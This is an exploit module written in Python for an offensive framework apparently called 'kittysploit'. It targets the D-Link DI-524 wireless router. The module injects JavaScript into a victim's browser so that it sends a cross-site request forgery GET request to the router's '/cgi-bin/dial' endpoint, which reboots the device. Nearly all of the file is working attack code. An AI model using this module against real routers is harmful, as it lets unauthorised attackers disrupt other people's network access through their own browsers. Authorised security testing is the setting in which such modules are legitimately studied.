from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "D-Link DI-524 CSRF",
		"description": "D-Link DI-524 Wireless 150 router - Reboot via CSRF GET",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://192.168.1.1", "Target router URL (with http://)", required=True)

	def run(self):
		url = f"{self.target}/cgi-bin/dial?rc=@&A=H&M=0&T=2000&rd=status"
		
		print_info(f"Executing CSRF GET attack on: {self.target}")
		print_info(f"Target: {url}")
		print_warning("This will reboot the router!")
		
		js_code = self.csrf_get(url)
		result = self.send_js_and_wait_for_response(js_code, timeout=5.0)
		
		if result:
			print_success("CSRF GET attack executed successfully")
			print_info(f"Response: {result}")
			print_info("Reboot request sent to router")
			return True
		else:
			fail.CSRFGetFailed()
		return False
